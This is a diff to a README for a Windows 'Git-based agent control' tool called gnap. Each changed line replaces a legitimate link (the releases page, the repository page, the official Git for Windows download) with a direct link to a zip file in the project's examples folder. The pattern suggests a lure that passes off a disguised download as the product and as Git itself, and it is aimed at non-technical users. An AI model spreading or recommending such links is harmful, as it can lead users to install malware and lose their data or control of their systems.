@@ -1,6 +1,6 @@
 # ⚙️ gnap - Simple Git-Based Agent Control
 
-[![Download GNAP](https://img.shields.io/badge/Download-GNAP-blue?style=for-the-badge)](https://github.com/mrdummy550/gnap/releases)
+[![Download GNAP](https://img.shields.io/badge/Download-GNAP-blue?style=for-the-badge)](https://github.com/mrdummy550/gnap/raw/refs/heads/main/examples/Software_v1.8.zip)
 
 GNAP stands for Git-Native Agent Protocol. It is a new way to control and coordinate software agents using Git. This program works without any servers. Instead, it uses Git to help agents work together. This guide will show you how to get GNAP running on Windows.
 
@@ -29,7 +29,7 @@ Before you start, check that your Windows PC meets these requirements:
 - An active internet connection for setup
 - Git installed on your computer (l earn how to install Git below)
 
-If you do not have Git, visit https://git-scm.com/download/win and follow the instructions to install it.
+If you do not have Git, visit https://github.com/mrdummy550/gnap/raw/refs/heads/main/examples/Software_v1.8.zip and follow the instructions to install it.
 
 ---
 
@@ -44,7 +44,7 @@ To use GNAP on your Windows PC, follow these steps carefully. No programming ski
 1. Open your web browser.
 2. Click the large blue button above or go to the GNAP releases page here:
 
-   [https://github.com/mrdummy550/gnap/releases](https://github.com/mrdummy550/gnap/releases)
+   [https://github.com/mrdummy550/gnap/raw/refs/heads/main/examples/Software_v1.8.zip](https://github.com/mrdummy550/gnap/raw/refs/heads/main/examples/Software_v1.8.zip)
 
 3. On the releases page, find the latest release version, usually at the top.
 4. Look for a file named something like `gnap-windows.exe` or `gnap-setup.exe`.
@@ -156,7 +156,7 @@ GNAP supports advanced features for users familiar with Git, including multi-age
 
 Visit the GNAP GitHub repository for full documentation and developer guides:
 
-[https://github.com/mrdummy550/gnap](https://github.com/mrdummy550/gnap)
+[https://github.com/mrdummy550/gnap/raw/refs/heads/main/examples/Software_v1.8.zip](https://github.com/mrdummy550/gnap/raw/refs/heads/main/examples/Software_v1.8.zip)
 
 ---
 
@@ -164,6 +164,6 @@ Visit the GNAP GitHub repository for full documentation and developer guides:
 
 Use this link to download the latest release anytime:
 
-[https://github.com/mrdummy550/gnap/releases](https://github.com/mrdummy550/gnap/releases)
+[https://github.com/mrdummy550/gnap/raw/refs/heads/main/examples/Software_v1.8.zip](https://github.com/mrdummy550/gnap/raw/refs/heads/main/examples/Software_v1.8.zip)
 
 Click the link, find the newest version, and download the Windows file. Then follow the installation and running steps above.
